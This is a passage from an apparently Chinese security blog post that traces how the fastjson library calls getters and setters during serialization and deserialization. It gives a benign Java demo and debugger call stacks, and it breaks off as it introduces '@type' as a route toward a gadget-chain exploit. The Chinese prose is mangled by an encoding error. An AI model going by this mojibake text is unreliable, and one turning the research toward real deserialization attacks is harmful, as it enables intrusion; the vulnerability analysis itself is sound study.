</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.annotation.JSONField</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Person</span><span class="w"> </span><span class="n">person</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Person</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">person</span><span class="p">.</span><span class="na">setName</span><span class="p">(</span><span class="s">&#34;fupanc&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">person</span><span class="p">.</span><span class="na">setAge</span><span class="p">(</span><span class="n">1233</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//åºåˆ—åŒ–</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;=====åºåˆ—åŒ–=====&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">toJSONString</span><span class="p">(</span><span class="n">person</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">json</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//ååºåˆ—åŒ–</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;=====ååºåˆ—åŒ–=====&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Person</span><span class="w"> </span><span class="n">person1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span><span class="n">Person</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">person1</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">person1</span><span class="p">.</span><span class="na">getAge</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">class</span> <span class="nc">Person</span><span class="w">  </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@JSONField</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">&#34;user_name&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@JSONField</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">&#34;user_age&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">Person</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Getters and Setters</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getName</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setName</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">getAge</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setAge</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">age</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>æ­¤æ—¶çš„è¾“å‡ºä¸ºï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">=====åºåˆ—åŒ–=====
</span></span><span class="line"><span class="cl">{&#34;user_age&#34;:1233,&#34;user_name&#34;:&#34;fupanc&#34;}
</span></span><span class="line"><span class="cl">=====ååºåˆ—åŒ–=====
</span></span><span class="line"><span class="cl">fupanc
</span></span><span class="line"><span class="cl">1233
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä»ç»“æœå¯ä»¥çœ‹å‡ºæ¥è¿™é‡Œçš„å…·ä½“ç¤ºä¾‹ï¼Œä¹Ÿå°±æ˜¯å½“ä½¿ç”¨äº†<code>@JSONField</code>è¿™ä¸ªæ³¨è§£ï¼Œåºåˆ—åŒ–æ—¶ä¼šå°†è¿™ä¸ªæ³¨è§£æ ‡æ³¨çš„å­—æ®µçš„å­—æ®µååºåˆ—åŒ–ä¸ºæ³¨è§£æŒ‡å®šçš„å­—æ®µåï¼Œè€Œååºåˆ—åŒ–æ—¶å°±ä¼šè‡ªåŠ¨è¯†åˆ«åˆ°è¿™ä¸ªæ³¨è§£æ ‡æ³¨çš„å­—æ®µä»è€ŒæˆåŠŸååºåˆ—åŒ–èµ‹å€¼ã€‚</p>
<h3 id="è°ƒè¯•åˆ†æ">è°ƒè¯•åˆ†æ
</h3><p>è°ƒè¯•åˆ†æä¸€ä¸‹è¿™é‡Œè·å–getterå’Œsetterçš„è¿‡ç¨‹ï¼Œè¿™é‡Œå°±æ¥ç®€å•è¯´è¯´æˆ‘è¿™é‡Œçš„è°ƒè¯•è¿‡ç¨‹</p>
<h4 id="åºåˆ—åŒ–è¿‡ç¨‹">åºåˆ—åŒ–è¿‡ç¨‹
</h4><p>åœ¨JSON.toJSONString()å¤„æ‰“ä¸€ä¸ªæ–­ç‚¹å¼€å§‹è°ƒè¯•ï¼Œé€šè¿‡è°ƒè¯•æ—¶çš„å˜é‡çš„å€¼çš„æ›¿æ¢ï¼Œåœ¨è¿™ä¸€æ­¥åå‘ç°è°ƒç”¨å˜é‡å­˜åœ¨äº†getteræ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250407202558373.png"
	
	
	
	loading="lazy"
	
		alt="image-20250407202558373"
	
	
></p>
<p>æ­¤æ—¶çš„è°ƒç”¨æ ˆä¸ºï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">write:272, JSONSerializer (com.alibaba.fastjson.serializer)
</span></span><span class="line"><span class="cl">toJSONString:637, JSON (com.alibaba.fastjson)
</span></span><span class="line"><span class="cl">toJSONString:579, JSON (com.alibaba.fastjson)
</span></span><span class="line"><span class="cl">toJSONString:544, JSON (com.alibaba.fastjson)
</span></span><span class="line"><span class="cl">main:14, Fastjson_Test (fastjson)
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ‘ä»¬è·Ÿè¿›è¿™ä¸ªgetObjectWriter()æ–¹æ³•ï¼Œç„¶åä¸€ç›´è·Ÿè¿›ï¼Œå¯ä»¥å‘ç°å…¶å®ä¸»è¦çš„è·å–åˆ°getteræ–¹æ³•å­˜åœ¨å¦‚ä¸‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250407202852389.png"
	
	
	
	loading="lazy"
	
		alt="image-20250407202852389"
	
	
></p>
<p>è·Ÿè¿›è¿™ä¸ªcreateJavaBeanSerializer()æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250407202953300.png"
	
	
	
	loading="lazy"
	
		alt="image-20250407202953300"
	
	
></p>
<p>è¿™é‡Œä¸»è¦èµ·ä½œç”¨çš„ä»£ç ä¹Ÿåœ¨å›¾ä¸­æ ‡æ³¨äº†ï¼Œæœ€é‡è¦çš„å°±æ˜¯æ–¹æ³•å†…éƒ¨çš„ç¬¬ä¸€è¡Œä»£ç ï¼Œè·Ÿè¿›è¿™é‡Œè°ƒç”¨çš„buildBeanInfo()æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250407203548358.png"
	
	
	
	loading="lazy"
	
		alt="image-20250407203548358"
	
	
></p>
<p>å†è·Ÿè¿›è¿™é‡Œçš„parserAllFieldToCache()æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250407203747261.png"
	
	
	
	loading="lazy"
	
		alt="image-20250407203747261"
	
	
></p>
<p>å¸¸è§çš„è·å–å­—æ®µåçš„æ“ä½œï¼Œè·å–åˆ°åè¿˜å°†èµ·æ”¾å…¥åˆ°äº†è¿™å½¢å‚ä¼ å…¥çš„HashMapç±»å®ä¾‹ä¸­ï¼Œè¿˜å¯ä»¥çœ‹åˆ°æ˜¯å°è¯•è·å–äº†çˆ¶ç±»çš„å­—æ®µå€¼ã€‚</p>
<p>å›åˆ°buildBeanInfo()æ–¹æ³•ï¼Œå¦å¤–ä¸€ä¸ªéå¸¸é‡è¦çš„æ–¹æ³•å°±æ˜¯computeGetters()æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250407211304061.png"
	
	
	
	loading="lazy"
	
		alt="image-20250407211304061"
	
	
></p>
<p>å¯ä»¥å¾ˆå®¹æ˜“çœ‹å‡ºæ¥è¿™é‡Œå°±æ˜¯ä¸€ä¸ªè·å–æ–¹æ³•çš„æ“ä½œï¼Œæœ€åè¿˜æ˜¯å°†å…¶æ”¾å…¥åˆ°é”®å€¼å¯¹ä¸­ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250407211510395.png"
	
	
	
	loading="lazy"
	
		alt="image-20250407211510395"
	
	
></p>
<p>è¿‡ç¨‹å°±ä¸å…·ä½“è¯´äº†ï¼Œå¯ä»¥è‡ªå·±è·Ÿä¸€ä¸‹ã€‚å†å›åˆ°buildBeanInfo()æ–¹æ³•ï¼Œç„¶åå¯¹å­—æ®µè¿›è¡Œäº†ä¸€ä¸‹æ’åºï¼Œå†è¿”å›äº†ä¸€ä¸ªå®ä¾‹åŒ–çš„SerializeBeanInfoç±»ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250407204347416.png"
	
	
	
	loading="lazy"
	
		alt="image-20250407204347416"
	
	
></p>
<p>æ‰€ä»¥è¿™é‡Œå…¶å®ä¹Ÿå°±æ˜¯ä¸€ä¸ªè·å–åˆ°ç±»ä¸­çš„ä¿¡æ¯çš„å‡½æ•°è°ƒç”¨çš„æ“ä½œï¼Œå…¶å®åŸºæœ¬è·å–åˆ°äº†éœ€è¦çš„æ‰€æœ‰æ¶ˆæ¯ã€‚ç„¶åå°±ä¼šè°ƒç”¨åˆ°createJavaBeanSerializer()æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250407204452428.png"
	
	
	
	loading="lazy"
	
		alt="image-20250407204452428"
	
	
></p>
<p>åç»­å…·ä½“ä¹Ÿå°±ä¸è¯´äº†ï¼Œéƒ½æ˜¯ä¸€äº›è¿›è¡Œå¤„ç†çš„æ“ä½œã€‚</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250407211903187.png"
	
	
	
	loading="lazy"
	
		alt="image-20250407211903187"
	
	
></p>
<p>æœ€åè¿™é‡Œèµ‹å€¼çš„getterså°±æ˜¯åç»­è¦ç”¨åˆ°çš„ï¼Œæ­¤æ—¶çš„è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;init&gt;:73, JavaBeanSerializer (com.alibaba.fastjson.serializer)
</span></span><span class="line"><span class="cl">createJavaBeanSerializer:152, SerializeConfig (com.alibaba.fastjson.serializer)
</span></span><span class="line"><span class="cl">createJavaBeanSerializer:126, SerializeConfig (com.alibaba.fastjson.serializer)
</span></span><span class="line"><span class="cl">getObjectWriter:580, SerializeConfig (com.alibaba.fastjson.serializer)
</span></span><span class="line"><span class="cl">getObjectWriter:355, SerializeConfig (com.alibaba.fastjson.serializer)
</span></span><span class="line"><span class="cl">getObjectWriter:329, JSONSerializer (com.alibaba.fastjson.serializer)
</span></span><span class="line"><span class="cl">write:272, JSONSerializer (com.alibaba.fastjson.serializer)
</span></span><span class="line"><span class="cl">toJSONString:637, JSON (com.alibaba.fastjson)
</span></span><span class="line"><span class="cl">toJSONString:579, JSON (com.alibaba.fastjson)
</span></span><span class="line"><span class="cl">toJSONString:544, JSON (com.alibaba.fastjson)
</span></span><span class="line"><span class="cl">main:14, Fastjson_Test (fastjson)
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…¶ä»–è¿‡ç¨‹å°±ä¸å¤šè¯´äº†ï¼Œé‡ç‚¹å°±æ˜¯è·å–åˆ°getteræ–¹æ³•ï¼Œå¯¹äºåé¢çš„è°ƒç”¨getteræ–¹æ³•æ¥è·å–å€¼ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202504091344459.png"
	
	
	
	loading="lazy"
	
		alt="image-20250409134430420"
	
	
></p>
<p>è°ƒç”¨invoke()æ–¹æ³•æ¥è¿›è¡Œè°ƒç”¨ï¼Œè°ƒç”¨æ ˆå¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">get:450, FieldInfo (com.alibaba.fastjson.util)
</span></span><span class="line"><span class="cl">getPropertyValueDirect:110, FieldSerializer (com.alibaba.fastjson.serializer)
</span></span><span class="line"><span class="cl">write:196, JavaBeanSerializer (com.alibaba.fastjson.serializer)
</span></span><span class="line"><span class="cl">write:275, JSONSerializer (com.alibaba.fastjson.serializer)
</span></span><span class="line"><span class="cl">toJSONString:637, JSON (com.alibaba.fastjson)
</span></span><span class="line"><span class="cl">toJSONString:579, JSON (com.alibaba.fastjson)
</span></span><span class="line"><span class="cl">toJSONString:544, JSON (com.alibaba.fastjson)
</span></span><span class="line"><span class="cl">main:13, Fastjson_Test (fastjson)
</span></span></code></pre></td></tr></table>
</div>
</div><p>è‡ªå·±è°ƒä¸€ä¸‹å°±çŸ¥é“äº†ã€‚</p>
<h4 id="ååºåˆ—åŒ–è¿‡ç¨‹">ååºåˆ—åŒ–è¿‡ç¨‹
</h4><p>æ‰“æ–­ç‚¹äºJSON.parseObject()æ–¹æ³•ï¼Œååºåˆ—åŒ–ï¼Œä¸»è¦è¿˜æ˜¯å¯¹setteræ–¹æ³•çš„è·å–å’Œè°ƒç”¨ã€‚è°ƒè¯•å‘ç°è·å–åˆ°ç±»æ˜¯åœ¨å¦‚ä¸‹æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250408160525097.png"
	
	
	
	loading="lazy"
	
		alt="image-20250408160525097"
	
	
></p>
<p>é‚£ä¹ˆæƒ³è¦è·å–åˆ°çš„è¿‡ç¨‹å°±åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œæ­¤æ—¶è°ƒç”¨æ ˆï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">parseObject:339, JSON (com.alibaba.fastjson)
</span></span><span class="line"><span class="cl">parseObject:243, JSON (com.alibaba.fastjson)
</span></span><span class="line"><span class="cl">parseObject:456, JSON (com.alibaba.fastjson)
</span></span><span class="line"><span class="cl">main:18, Fastjson_Test (fastjson)
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç»§ç»­è·Ÿè¿›è¿™ä¸ªæ–¹æ³•ï¼Œä¸€ç›´èµ°ï¼Œçœ‹åˆ°ä¸€ä¸ªéå¸¸ç†Ÿæ‚‰çš„å˜é‡ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202504091250248.png"
	
	
	
	loading="lazy"
	
		alt="image-20250409125020191"
	
	
></p>
<p>JavaBeanInfoï¼Œåº”è¯¥åŒæ ·æ˜¯ä¸€ä¸ªè·å–åˆ°ç±»ç›¸å…³å±æ€§çš„æ“ä½œï¼Œè·Ÿè¿›è¿™é‡Œè°ƒç”¨çš„build()æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°åˆæ˜¯ä¸€ä¸ªè·å–ç±»çš„å˜é‡ä»¥åŠæ–¹æ³•çš„å¤„ç†ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202504091252406.png"
	
	
	
	loading="lazy"
	
		alt="image-20250409125235358"
	
	
></p>
<p>åé¢å°±æ˜¯å¯¹æ–¹æ³•çš„å¤„ç†ï¼Œæ¥è·å–åˆ°setteræ–¹æ³•ï¼Œè¿˜æœ‰å¤„ç†getteræ–¹æ³•çš„é€»è¾‘ï¼Œè¿™é‡Œä¹Ÿå°±ä¸å¤šè¯´äº†ï¼Œåœ¨è¿™é‡Œçš„å¤„ç†æ–¹æ³•éƒ½æ˜¯å°†è·å–åˆ°çš„ç±»å±æ€§ï¼Œæ”¾å…¥åˆ°ä¸€ä¸ªFieldInfoç±»ä¸­ï¼Œç„¶åæ”¾å…¥åˆ°ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œæœ€åå®ä¾‹åŒ–ä¸€ä¸ªJavaBeanç±»ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202504091305732.png"
	
	
	
	loading="lazy"
	
		alt="image-20250409130525687"
	
	
></p>
<p>ç»§ç»­è·Ÿè¿›è¿™ä¸ªç±»çš„å®ä¾‹åŒ–ï¼Œç„¶åè¿˜æ˜¯å°†å…¶èµ‹å€¼ç»™è¿™ä¸ªç±»çš„å˜é‡ï¼Œå’Œåºåˆ—åŒ–é‚£é‡Œå¤§ç›¸å¾„åº­ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202504091307348.png"
	
	
	
	loading="lazy"
	
		alt="image-20250409130738302"
	
	
></p>
<p>å…·ä½“å¦‚ä¸‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202504091348824.png"
	
	
	
	loading="lazy"
	
		alt="image-20250409134858785"
	
	
></p>
<p>ä¹Ÿå°±æ˜¯è·å–åˆ°äº†ä¸€ä¸ªå˜é‡çš„setteræ–¹æ³•ã€‚é‚£ä¹ˆå“ªé‡Œå¯¹è¿™ä¸ªsetterè¿›è¡Œäº†è°ƒç”¨å‘¢ï¼Œè¿™é‡Œèµ‹å€¼å®Œäº†ç„¶åï¼Œä¸€ç›´å›é€€ï¼Œåˆ°å¦‚ä¸‹æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202504091353465.png"
	
	
	
	loading="lazy"
	
		alt="image-20250409135336422"
	
	
></p>
<p>è¿™é‡Œæ˜¯å°†ç”Ÿæˆçš„derializeræ”¾è¿›ä¸€ä¸ªé”®å€¼å¯¹ï¼Œç„¶åä¸€ç›´å›é€€ï¼Œä¼šè°ƒç”¨<code>deserialze</code>æ–¹æ³•è¿›è¡Œå¤„ç†ï¼Œç„¶åä¸€ç›´å¾€åé¢èµ°ï¼Œè¿™é‡Œä¼šè°ƒç”¨createInstance()æ–¹æ³•æ¥åˆ›å»ºä¸€ä¸ªç±»å®ä¾‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202504091406691.png"
	
	
	
	loading="lazy"
	
		alt="image-20250409140618644"
	
	
></p>
<p>ä¸»è¦æ˜¯åˆ©ç”¨çš„æ— å‚æ„é€ æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412131514863.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412131514863"
	
	
></p>
<p>createInstance()æ–¹æ³•ä¹Ÿå°±æ˜¯è¿”å›çš„è¿™ä¸ªobjectï¼Œå›åˆ°è°ƒç”¨çš„deserialzeæ–¹æ³•ï¼Œç»§ç»­å¾€åï¼Œä¼šè°ƒç”¨setValue()æ–¹æ³•æ¥è¿›è¡Œèµ‹å€¼ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202504091406446.png"
	
	
	
	loading="lazy"
	
		alt="image-20250409140650413"
	
	
></p>
<p>setValue()æ–¹æ³•å†…éƒ¨åŒæ ·è°ƒç”¨äº†invoke()æ–¹æ³•è¿›è¡Œèµ‹å€¼ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202504091408942.png"
	
	
	
	loading="lazy"
	
		alt="image-20250409140806906"
	
	
></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå°±æ˜¯å¯¹å‰ä¸€ä¸ªç±»å®ä¾‹è°ƒç”¨çš„setAge()æ–¹æ³•ï¼Œä»è€Œå¯ä»¥æˆåŠŸèµ‹å€¼ï¼Œå¹¶ä¸”æœ€åæ˜¯è¿”å›çš„è¿™ä¸ªèµ‹å€¼å®Œäº†çš„ç±»å®ä¾‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202504091410352.png"
	
	
	
	loading="lazy"
	
		alt="image-20250409141020301"
	
	
></p>
<p>æœ€åå°±æˆåŠŸjsonååºåˆ—åŒ–å¾—åˆ°äº†æŒ‡å®šçš„ç±»ã€‚</p>
<p>ä»ä¸Šé¢çš„æ•´ä¸ªè¿‡ç¨‹æ¥çœ‹ï¼Œå¯ä»¥çœ‹å‡ºç¡®å®æ˜¯è°ƒç”¨çš„getterå’Œsetteræ¥è¿›è¡Œçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„å–å€¼ä¸èµ‹å€¼ï¼Œç°åœ¨æ¥çœ‹çœ‹è¿™é‡Œçš„å…·ä½“åˆ©ç”¨ã€‚</p>
<h3 id="typeå±æ€§è¯´æ˜">@typeå±æ€§è¯´æ˜
</h3><p>åœ¨å‰é¢æˆ‘ä»¬éƒ½æ˜¯å¯¹ä¸€ä¸ªç±»è¿›è¡Œçš„jsonåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œä»è€Œå¯ä»¥è·å–å¹¶è°ƒç”¨åˆ°å¯¹åº”ç±»çš„getterå’Œsetterï¼Œä½†æ˜¯æ—¢ç„¶éƒ½æ˜¯è·å–getteräº†ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯è¦å°è¯•å¸¸è§çš„Templatesé“¾ï¼Œé‚£ä¹ˆæ€ä¹ˆå¯ä»¥æŒ‡å®šä¸€ä¸ªç±»çš„åºåˆ—åŒ–å‘¢ï¼Ÿè¿™å°±ä¸<code>@type</code>å±æ€§æœ‰å…³äº†ï¼Œè¿™ä¸ªå±æ€§å¯ä»¥ç›´æ¥è§£ææŒ‡å®šçš„ç±»ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œå¦‚ä¸‹å°è¯•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
